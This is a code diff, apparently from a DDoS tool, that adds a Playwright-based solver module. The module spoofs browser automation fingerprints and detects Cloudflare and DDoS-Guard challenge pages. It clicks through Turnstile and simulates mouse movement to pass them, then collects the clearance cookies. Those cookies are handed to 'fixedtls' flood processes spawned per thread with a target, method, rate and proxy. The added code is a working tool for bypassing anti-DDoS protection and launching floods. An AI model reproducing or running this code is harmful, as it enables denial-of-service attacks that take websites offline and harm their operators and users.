@@ -5,10 +5,26 @@ require('events').EventEmitter.defaultMaxListeners = Infinity;
 
 const JSList = {
   js: [
-    { name: "CloudFlare (Secure JS)", navigations: 2, locate: '<h2 class="h2" id="challenge-running">' },
-    { name: "CloudFlare", navigations: 1, locate: '<title>Just a moment...</title>' },
-    { name: "DDoS-Guard", navigations: 1, locate: 'document.getElementById("title").innerHTML="Проверка браузера перед переходом на сайт "+host;' },
-    { name: "DDoS-Guard-en", navigations: 1, locate: 'document.getElementById("description").innerHTML="This process is automatic. Your browser will redirect to your requested content shortly.<br>Please allow up to 5 seconds...";' }
+    {
+      name: "CloudFlare (Secure JS)",
+      navigations: 2,
+      locate: '<h2 class="h2" id="challenge-running">'
+    },
+    {
+      name: "CloudFlare",
+      navigations: 1,
+      locate: '<title>Just a moment...</title>'
+    },
+    {
+      name: "DDoS-Guard",
+      navigations: 1,
+      locate: 'document.getElementById("title").innerHTML="Проверка браузера перед переходом на сайт "+host;'
+    },
+    {
+      name: "DDoS-Guard-en",
+      navigations: 1,
+      locate: 'document.getElementById("description").innerHTML="This process is automatic. Your browser will redirect to your requested content shortly.<br>Please allow up to 5 seconds...";'
+    }
   ]
 };
 
@@ -61,13 +77,29 @@ async function solverInstance(args) {
   const browser = await playwright.chromium.launch({
     headless: true,
     args: [
-      '--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu',
-      '--disable-features=site-per-process,IsolateOrigins', '--disable-infobars', '--no-first-run',
-      '--ignore-certificate-errors', '--ignore-ssl-errors', '--no-default-browser-check',
-      '--disable-popup-blocking', '--disable-extensions', '--disable-background-networking',
-      '--disable-background-timer-throttling', '--disable-renderer-backgrounding', '--disable-hang-monitor',
-      '--disable-sync', '--metrics-recording-only', '--disable-default-apps', '--mute-audio', '--no-zygote',
-      '--max-connections-per-host=6', '--autoplay-policy=no-user-gesture-required',
+      '--no-sandbox',
+      '--disable-setuid-sandbox',
+      '--disable-dev-shm-usage',
+      '--disable-gpu',
+      '--disable-features=site-per-process,IsolateOrigins',
+      '--disable-infobars',
+      '--no-first-run',
+      '--ignore-certificate-errors',
+      '--ignore-ssl-errors',
+      '--no-default-browser-check',
+      '--disable-popup-blocking',
+      '--disable-extensions',
+      '--disable-background-networking',
+      '--disable-background-timer-throttling',
+      '--disable-renderer-backgrounding',
+      '--disable-hang-monitor',
+      '--disable-sync',
+      '--metrics-recording-only',
+      '--disable-default-apps',
+      '--mute-audio',
+      '--no-zygote',
+      '--max-connections-per-host=6',
+      '--autoplay-policy=no-user-gesture-required',
       '--disable-blink-features=AutomationControlled'
     ]
   });
@@ -111,8 +143,12 @@ async function solverInstance(args) {
   await page.addInitScript(() => {
     Object.defineProperty(navigator, 'webdriver', { get: () => false });
     window.chrome = { runtime: {} };
-    Object.defineProperty(navigator, 'languages', { get: () => ['ru-RU', 'ru'] });
-    Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
+    Object.defineProperty(navigator, 'languages', {
+      get: () => ['ru-RU', 'ru']
+    });
+    Object.defineProperty(navigator, 'plugins', {
+      get: () => [1, 2, 3]
+    });
     const getParameter = WebGLRenderingContext.prototype.getParameter;
     WebGLRenderingContext.prototype.getParameter = function (parameter) {
       if (parameter === 37445) return 'Intel Inc.';
@@ -136,7 +172,106 @@ async function solverInstance(args) {
 
   log(`(${`PlayWright`.cyan}) UA: ${uaConfig.userAgent.green}`);
 
-  const passed1 = await processProtection(page, 'JSDetect [1/2]');
-  const passed2 = await processProtection(page, 'JSDetect [2/2]');
+  await processProtection(page, 'JSDetect [1/2]');
+  await processProtection(page, 'JSDetect [2/2]');
 
-  const cookies = cookiesTo
+  const cookies = cookiesToStr(await page.context().cookies());
+  const title = await page.title();
+
+  log(`(${`Harvester`.green}) Заголовок: ${title}`);
+  log(`(${`Harvester`.green}) Cookies: ${cookies.yellow}`);
+
+  for (let i = 0; i < args.Threads; i++) {
+    spawn('./fixedtls', [args.Target, uaConfig.userAgent, args.Time, cookies, args.Method, args.Rate, args.Proxy]);
+  }
+
+  log(`(${`PlayWright`.green}) Сессия закрыта.`);
+  await browser.close();
+  return cookies;
+}
+
+async function processProtection(page, label) {
+  const html = await page.content();
+  const title = await page.title();
+
+  if (title === "Access denied") {
+    log(`(${label.red}) Доступ к странице запрещён.`);
+    return;
+  }
+
+  const detected = JSDetection(html);
+  if (detected) {
+    log(`(${label.green}) защита: ${detected.name.yellow}`);
+
+  if (detected.name === "CloudFlare") {
+    try {
+      let redirectHappened = false;
+  
+      // Ждём 19 секунд перед началом обработки
+      log(`[${'Playwright'.cyan}] Жду 19 секунд перед обработкой Turnstile...`);
+      await sleep(19000);
+  
+      while (!redirectHappened) {
+        const frame = page.frames().find(f => f.url().includes('challenges.cloudflare.com'));
+        if (!frame) {
+          log(`[${'Playwright'.red}] Фрейм Turnstile не найден.`);
+          break;
+        }
+  
+        const checkbox = await frame.$('input[type="checkbox"]');
+        if (!checkbox) {
+          log(`[${'Playwright'.red}] Чекбокс Turnstile не найден во фрейме.`);
+          break;
+        }
+  
+        const box = await checkbox.boundingBox();
+        if (!box) {
+          log(`[${'Playwright'.red}] Не удалось получить координаты чекбокса Turnstile.`);
+          break;
+        }
+  
+        await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2, { steps: 20 });
+        await page.mouse.click(box.x + box.width / 2, box.y + box.height / 2);
+  
+        try {
+          const response = await page.waitForNavigation({ timeout: 10000 });
+          if (response) {
+            log(`[${'Playwright'.green}] Навигация прошла успешно`);
+            redirectHappened = true;
+          } else {
+            log(`[${'Playwright'.yellow}] Редирект не произошел, пробую снова...`);
+          }
+        } catch (e) {
+          log(`[${'Playwright'.yellow}] Навигация не произошла: ${e.message}, пробую снова...`);
+        }
+  
+        await sleep(3000);
+      }
+    } catch (e) {
+      log(`[${'Playwright'.red}] Ошибка при обработке Turnstile: ${e.message}`);
+    }
+  }
+
+    if (["DDoS-Guard", "DDoS-Guard-en"].includes(detected.name)) {
+      for (let i = 0; i < 5; i++) {
+        await page.mouse.move(randomIntFromInterval(0, 100), randomIntFromInterval(0, 100));
+      }
+      await page.mouse.down();
+      await page.mouse.move(100, 100);
+      await page.mouse.up();
+      await sleep(20630);
+      await page.reload({ waitUntil: 'domcontentloaded' });
+    }
+
+    for (let i = 0; i < detected.navigations; i++) {
+      await page.waitForNavigation();
+      log(`(${`Навигация`.green}) [${i + 1}/${detected.navigations}]`);
+    }
+  } else {
+    log(`(${label}) Девки нас не ждут заходим`);
+  }
+}
+
+module.exports = {
+  solverInstance
+};
